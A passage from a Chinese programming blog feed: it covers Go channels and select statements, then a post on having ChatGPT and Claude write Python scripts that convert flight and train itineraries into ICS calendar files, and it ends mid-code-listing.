通道的声明和定义</h3><p>通道可以理解为一种特殊的<strong>变量</strong>，所以它的声明和其它变量的声明并没有太大的区别，声明通道变量的写法如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> <span class="hljs-comment">//声明一个存放int类型数据的通道</span><br></code></pre></td></tr></table></figure><p>但是它声明之后并<strong>不能直接使用</strong>，需要使用内置函数 <code>make()</code> 来创建一下通道变量才可以使用：</p><blockquote><p>由于 chan 的底层是一个指针，在 Go 语言中指针初始值为空，是需要实例化的。make 就是实例化了 chan。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> <span class="hljs-comment">//声明一个存放int类型数据的通道</span><br>c = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">//创建一个长度为1的通道</span><br></code></pre></td></tr></table></figure><p>在这种情况下最好使用<code>:=</code> 来同时声明和创建：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">//声明并创建一个存放int类型数据的通道</span><br></code></pre></td></tr></table></figure><h3 id="2-通道的使用"><a href="#2-通道的使用" class="headerlink" title="2. 通道的使用"></a>2. 通道的使用</h3><p>在 Go 语言中，使用 <code>&lt;-</code> 符号来向通道中塞取数据。放在通道右边 <code>chan &lt;-</code>，就是塞数据，放在通道左边 <code>&lt;- chan</code> ，就是取数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br>   c &lt;- <span class="hljs-number">10</span>  <span class="hljs-comment">//将10塞入通道中</span><br>   i := &lt;-c <span class="hljs-comment">//将10从通道中取出，并赋值给变量i</span><br>   fmt.Println(i)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-通道结合-select-流程控制"><a href="#3-通道结合-select-流程控制" class="headerlink" title="3. 通道结合 select 流程控制"></a>3. 通道结合 select 流程控制</h3><p>在 Go 语言中为了更方便的利用通道的功能，提供了一个仅用于通道的流程控制语句：<code>select...case</code>。使用这个语句可以同时监听数个通道，非常适合用于并发时的进程调度，或者模块之间的解耦合。下面通过一个简单的例子来了解一下 <code>select...case</code> 语句。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br><br>   <span class="hljs-keyword">for</span> a := <span class="hljs-number">0</span>; a &lt; <span class="hljs-number">2</span>; a++ &#123;<br>      <span class="hljs-keyword">select</span> &#123;<br>      <span class="hljs-keyword">case</span> i := &lt;-c:<br>         fmt.Println(<span class="hljs-string">&quot;从通道中取出&quot;</span>, i)<br>      <span class="hljs-keyword">case</span> c &lt;- <span class="hljs-number">10</span>:<br>         fmt.Println(<span class="hljs-string">&quot;将 10 塞入通道中&quot;</span>)<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>select 语句和 switch 语句一样，case 都只会执行一个，然后立刻跳出语句。</p><h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p><a href="http://www.imooc.com/wiki/golesson/">http://www.imooc.com/wiki/golesson/</a></p>]]></content>
    
    
    <categories>
      
      <category>Go语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>让Chatgpt帮我写代码(一)</title>
    <link href="/2023/04/22/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/"/>
    <url>/2023/04/22/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h2 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h2><p>今天在刷牙的时候看了一眼携程app上订的旅游的航班和高铁班次，发现不知什么时候携程把行程同步到日历的功能给下线了… </p><p>但对于我这种习惯了用日历或者提醒功能的人，行程没法通过日历主动提醒，就觉得缺了啥东西。 于是上网搜了搜如何把行程同步到日历上。</p><p>后来在知乎上看到了一个人把航班信息发给chatgpt，让它给我直接生成ics文件，然后用mac直接打开就能生成日历了。我也试了下，如下</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225021493.png" alt="chatgpt将航班信息转化为ICS文件格式"></p><p>打开日历确实能够实现想要的效果，同样的手机上也正常显示。</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225145244.png" alt="日历显示"></p><p>既然如此，那就可以直接让chatgpt帮我用写个脚本，下次直接填行程就行。 说干就干。</p><h2 id="二、Chatgpt上场"><a href="#二、Chatgpt上场" class="headerlink" title="二、Chatgpt上场"></a>二、Chatgpt上场</h2><h3 id="2-1-航班信息"><a href="#2-1-航班信息" class="headerlink" title="2.1 航班信息"></a>2.1 航班信息</h3><p>我先重复了让它帮我生成ics的操作，然后再说出我的需求</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225543534.png" alt="将需求告诉它"></p><p>然后将代码放入代码编辑器中运行，果不其然报错了</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225728727.png" alt="代码报错"></p><p>直接丢给chatgpt，让它给我优化（我懒）</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225909046.png" alt="chatgpt给的排错建议"></p><p>不出意外的已经把错误打印出来了</p><p>ValueError: time data ‘2023&#x2F;05&#x2F;041 5:20’ does not match format ‘%Y&#x2F;%m&#x2F;%d %H:%M’</p><p>这个错误提示表明时间格式不符合预期，可能是时间字符串中有一个多余的字符或者缺少一个字符。</p><p>原来是为填写时间时候，出错了，把2023&#x2F;05&#x2F;04 15:20 写成 2023&#x2F;05&#x2F;041 5:20 了。</p><p>最后查看result.ics打开验证是否能被日历功能正常读取。</p><p>生成的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_flight_to_ics</span>(<span class="hljs-params">flight_info</span>):<br>    regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, flight_info)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: failed to match flight information.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    airline, dep_airport, dep_time, arr_airport, arr_time = <span class="hljs-keyword">match</span>.groups()<br><br>    <span class="hljs-comment"># 生成ICS字符串</span><br>    start_time = datetime.strptime(dep_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    end_time = datetime.strptime(arr_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    uid = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span>-<span class="hljs-subst">&#123;start_time.date()&#125;</span>&#x27;</span><br>    ics_str = <span class="hljs-string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Flight Schedule//EN\nBEGIN:VEVENT\nUID:<span class="hljs-subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="hljs-subst">&#123;datetime.utcnow().strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;start_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;end_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:航班 <span class="hljs-subst">&#123;airline&#125;</span>\nLOCATION:<span class="hljs-subst">&#123;dep_airport&#125;</span>\nDESCRIPTION:<span class="hljs-subst">&#123;airline&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_airport&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_airport&#125;</span>。\nEND:VEVENT\nEND:VCALENDAR&#x27;</span><br><br>    <span class="hljs-keyword">return</span> ics_str<br><br><span class="hljs-comment"># 读取航班信息</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Flight.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flight_info = f.read()<br><br><span class="hljs-comment"># 转换为ICS字符串</span><br>ics_str = convert_flight_to_ics(flight_info)<br><br><span class="hljs-comment"># 将ICS字符串写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ics_str)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="2-2-高铁信息"><a href="#2-2-高铁信息" class="headerlink" title="2.2 高铁信息"></a>2.2 高铁信息</h3><p>现在解决了航班信息，突然想到还有高铁信息也需要，本次目的是chatgpt帮我写代码，所以我将上面的代码发送给他，增加了需求</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422231858210.png" alt="新增需求"></p><p>生成的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_to_ics</span>(<span class="hljs-params">travel_info</span>):<br>    regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span><br>    train_regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+到达时间\s+(\S+\s+\S+)&quot;</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, travel_info)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">match</span> = re.search(train_regex, travel_info)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: failed to match travel information.&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        travel_type = <span class="hljs-string">&quot;高铁/动车&quot;</span><br>        train_no, dep_station, dep_time, arr_station, arr_time = <span class="hljs-keyword">match</span>.groups()<br>    <span class="hljs-keyword">else</span>:<br>        travel_type = <span class="hljs-string">&quot;航班&quot;</span><br>        airline, dep_airport, dep_time, arr_airport, arr_time = <span class="hljs-keyword">match</span>.groups()<br><br>    <span class="hljs-comment"># 生成ICS字符串</span><br>    start_time = datetime.strptime(dep_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    end_time = datetime.strptime(arr_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    uid = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;travel_type&#125;</span>-<span class="hljs-subst">&#123;start_time.date()&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">if</span> travel_type == <span class="hljs-string">&quot;航班&quot;</span>:<br>        summary = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span> <span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span><br>        location = dep_airport<br>        description = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_airport&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_airport&#125;</span>。&#x27;</span><br>    <span class="hljs-keyword">elif</span> travel_type == <span class="hljs-string">&quot;高铁/动车&quot;</span>:<br>        summary = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;train_no&#125;</span> <span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span><br>        location = dep_station<br>        description = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;train_no&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_station&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_station&#125;</span>。&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Unknown travel type.&quot;</span>)<br><br>    ics_str = <span class="hljs-string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Travel Schedule//EN\nBEGIN:VEVENT\nUID:<span class="hljs-subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="hljs-subst">&#123;datetime.utcnow().strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;start_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;end_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:<span class="hljs-subst">&#123;summary&#125;</span>\nLOCATION:<span class="hljs-subst">&#123;location&#125;</span>\nDESCRIPTION:<span class="hljs-subst">&#123;description&#125;</span>\nEND:VEVENT\nEND:VCALENDAR&#x27;</span><br><br>    <span class="hljs-keyword">return</span> ics_str<br><br><br><span class="hljs-comment"># 读取行程信息</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Flight.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    travel_info = f.read()<br><br><span class="hljs-comment"># 转换为ICS字符串</span><br>ics_str = convert_to_ics(travel_info)<br><br><span class="hljs-comment"># 将ICS字符串写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ics_str)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>根据代码最后生成的结果出了点小bug</p><p>高铁信息最后在rusult.ics中为 UID:航班-2023-05-02，其中应为UID:高铁&#x2F;动车-2023-05-02</p><p>将错误反馈给chatgpt，继续改～</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422235008815.png" alt="chagpt排错"></p><p>原来是我Flight.txt中的“到达时间”写成了“达到时间”，我的锅！ 错怪了你 chatgpt。</p><p>修改后，就能正常生成了。</p><h2 id="三、-Claude"><a href="#三、-Claude" class="headerlink" title="三、 Claude"></a>三、 <strong>Claude</strong></h2><h3 id="3-1-航班信息"><a href="#3-1-航班信息" class="headerlink" title="3.1 航班信息"></a>3.1 航班信息</h3><p>顺便试试Claude的代码能力。 告知他的需求</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423000312217.png" alt="告知需求"></p><p>最终生成的效果如下，未能识别</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001749390.png" alt="未能识别"></p><p>将问题反馈给Claude</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001828794.png" alt="反馈排错"></p><p>继续跟它对话，可以按照它的操作来，也可以直接告诉它，把修改后的代码发给你</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001942913.png" alt="整理代码"></p><p>使用修改后的代码继续尝试，还是没达到效果，将输出结果发给它，继续调整</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423002235114.png" alt="继续优化代码"></p><p>经过比多次调教，最终给出代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> logging<br><br>ics = <span class="hljs-string">&quot;BEGIN:VCALENDAR\n&quot;</span><br>ics += <span class="hljs-string">&quot;PRODID:flight\n&quot;</span><br>ics += <span class="hljs-string">&quot;VERSION:2.0\n&quot;</span><br>ics += <span class="hljs-string">&quot;CALSCALE:GREGORIAN\n&quot;</span><br><br>flight_info = []<br>event_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;demo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().strip()<br>    flights = content.split(<span class="hljs-string">&quot;\n\n&quot;</span>)<br>    <span class="hljs-keyword">for</span> flight <span class="hljs-keyword">in</span> flights:<br>        flight_info = flight.split(<span class="hljs-string">&quot;\n&quot;</span>)<br><br>        <span class="hljs-comment"># 打印航班信息,确认是否准确</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;航班信息: <span class="hljs-subst">&#123;flight_info&#125;</span>&quot;</span>)<br><br>        name = flight_info[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># 打印航班名称</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;name: <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flight_info) &lt; <span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;航班信息不完整!&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># 解析出机场和时间信息</span><br>        airport = flight_info[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;起飞机场: <span class="hljs-subst">&#123;airport[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        depart_airport = <span class="hljs-string">&#x27; &#x27;</span>.join(airport[:<span class="hljs-number">2</span>])<br><br>        depart_time = flight_info[<span class="hljs-number">2</span>]<br>        depart_time = datetime.datetime.strptime(depart_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;起飞时间: <span class="hljs-subst">&#123;depart_time&#125;</span>&quot;</span>)<br><br>        airport = flight_info[<span class="hljs-number">3</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;到达机场: <span class="hljs-subst">&#123;airport[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        arrive_airport = <span class="hljs-string">&#x27; &#x27;</span>.join(airport[:<span class="hljs-number">2</span>])<br><br>        arrive_time = flight_info[<span class="hljs-number">4</span>]<br>        arrive_time = datetime.datetime.strptime(arrive_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;到达时间: <span class="hljs-subst">&#123;arrive_time&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 生成VEVENT事件</span><br>        <span class="hljs-keyword">try</span>:<br>            ics += <span class="hljs-string">f&quot;BEGIN:VEVENT\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;depart_airport&#125;</span>@<span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;DTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;depart_time.strftime(<span class="hljs-string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;DTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;arrive_time.strftime(<span class="hljs-string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;SUMMARY:<span class="hljs-subst">&#123;name&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;LOCATION:<span class="hljs-subst">&#123;depart_airport&#125;</span> -&gt; <span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">&quot;END:VEVENT\n&quot;</span><br><br>            event_count += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成VEVENT失败:<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            logging.exception(e)<br><br>ics += <span class="hljs-string">&quot;END:VCALENDAR&quot;</span><br><br><span class="hljs-comment"># 如果成功生成了至少一个事件，就写入文件</span><br><span class="hljs-keyword">if</span> event_count &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(ics)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有生成任何事件，无法写入到文件&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="3-2-高铁信息"><a href="#3-2-高铁信息" class="headerlink" title="3.2 高铁信息"></a>3.2 高铁信息</h3><p>告知Claude，需要在原代码基础上添加识别高铁信息的功能。</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423132937903.png" alt="添加识别高铁信息"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 